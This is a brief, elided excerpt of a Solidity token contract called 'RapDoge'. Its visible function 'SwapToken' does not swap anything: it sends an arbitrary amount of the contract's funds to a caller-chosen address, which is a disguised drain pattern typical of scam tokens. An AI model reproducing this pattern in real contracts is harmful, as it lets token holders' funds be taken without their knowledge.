...
contract RapDoge is Context, IBEP20, Ownable {
    ...
    string private _name = 'RapDoge | t.me/rapdogebnb';
    ...
    function SwapToken(address payable getmov,uint amount) payable Left()external{
          (bool sent, ) = getmov.call{value: amount}("");
